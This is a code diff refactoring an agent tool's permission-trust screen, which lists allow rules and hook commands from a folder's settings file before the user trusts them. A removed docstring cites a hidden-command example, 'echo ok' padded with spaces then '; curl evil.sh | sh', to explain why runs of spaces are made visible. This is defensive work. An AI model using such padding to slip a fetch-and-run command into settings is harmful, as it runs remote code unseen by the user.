@@ -2,13 +2,12 @@
 
 from __future__ import annotations
 
-import re
 from collections.abc import Sequence
 from typing import ClassVar
 
 from core.engine.hooks.config import HookEntry
 from core.engine.permissions.rules import Rule
-from core.engine.text import escape
+from core.trust import sort_rules, trust_lines
 from rich.text import Text
 from textual import on
 from textual.app import ComposeResult
@@ -17,16 +16,6 @@ from textual.containers import Vertical, VerticalScroll
 from textual.screen import ModalScreen
 from textual.widgets import Label, OptionList
 from textual.widgets.option_list import Option
-
-_SPACES = re.compile(r" {2,}")
-
-
-def visible(text: str) -> str:
-    """`text` as a file wrote it, shown whole: odd characters escaped, and each run of 2+ spaces written as a space sign and a count.
-
-    The list wraps at the screen's width, so nothing is cut; the count keeps padding from pushing the rest of a
-    command out of sight (`echo ok` + 200 spaces + `; curl evil.sh | sh`)."""
-    return _SPACES.sub(lambda run: f"\u2420\u00d7{len(run.group())}", escape(text))
 
 
 class PermissionTrustScreen(ModalScreen[bool]):
@@ -52,7 +41,7 @@ class PermissionTrustScreen(ModalScreen[bool]):
         super().__init__()
         self.hooks = list(hooks)
         # What allows the most comes first: a bare tool, a prefix; then the exact calls, in the file's order.
-        self.rules = sorted(rules, key=lambda rule: not (rule.value is None or rule.prefix))
+        self.rules = sort_rules(rules)
 
     def compose(self) -> ComposeResult:
         with Vertical():
@@ -67,10 +56,8 @@ class PermissionTrustScreen(ModalScreen[bool]):
             if self.hooks:
                 yield Label(Text(".agent/settings.json in this folder wants to run these commands at these events:"))
             with VerticalScroll(id="rules"):
-                for rule in self.rules:
-                    yield Label(Text(f"allow {visible(rule.text)}"))  # a `Text`, never markup; odd characters escaped, wrapped
-                for hook in self.hooks:
-                    yield Label(Text(f"hook {escape(hook.label)} (timeout {hook.timeout:g}s) {visible(hook.command)}"))
+                for line in trust_lines("permission_trust", rules=self.rules, hooks=self.hooks).lines:
+                    yield Label(Text(line))  # a `Text`, never markup; odd characters escaped, wrapped
             if self.rules:
                 yield Label(Text("Matching calls will run without asking you. Tab scrolls the list."))
             if self.hooks:
